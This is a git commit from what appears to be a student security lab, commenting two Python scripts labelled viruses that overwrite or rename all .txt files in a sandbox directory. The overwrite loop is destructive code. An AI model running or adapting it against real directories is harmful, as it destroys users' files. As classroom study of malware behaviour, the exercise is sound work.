cfa4b2d5716d0c039131f96e5982f7ecebfe5c70
jmaitoza <jmaitoza@umassd.edu>
2020-11-09 01:00:13 +0000

    Documents code

--- Lab3/virus1.py
+++ Lab3/virus1.py
@@ -1,16 +1,15 @@
 #!/usr/bin/env python3
 import glob, os, re
 mayatext = open('maya.txt', 'r')
-path = "/home/pi/sandbox"
+path = "/home/pi/sandbox" #for testing purposes the virus is sandboxed to a specific directory so it can only affect files in the specifc folder
 os.chdir(path)
-#mayatext = open('maya.txt', 'r')
 maya = mayatext.read()
 
-for files in glob.glob('*.txt'):
-    if re.match('maya.*\.txt', files):
+for files in glob.glob('*.txt'): #iterates through files in current directory with .txt extension
+    if re.match('maya.*\.txt', files): #if the files is the poem text file it skips over it and doesnt overwrite it
         continue
     else:
-        with open(files, 'w') as f:
+        with open(files, 'w') as f: #writes over the iterated file with mayatext
             f.write(maya)
 
 mayatext.close()
--- Lab3/virus2.py
+++ Lab3/virus2.py
@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 import glob, os, re
 
-path = "/home/pi/sandbox"
+path = "/home/pi/sandbox" #sandboxes the virus to attack specific directory
 os.chdir(path)
 name = "MAngelou"
-count = 1
+count = 1 
 text = ".txt"
-for files in glob.glob('*.txt'):
+for files in glob.glob('*.txt'): #iterates through files with .txt 
     if re.match('maya.*\.txt', files):
         continue
     else:
-        os.rename(files, "MAngelou" + str(count) + ".txt")
+        os.rename(files, "MAngelou" + str(count) + ".txt") #renames the file and turns the counter value into a string so it gets the correct value 
         count += 1
 
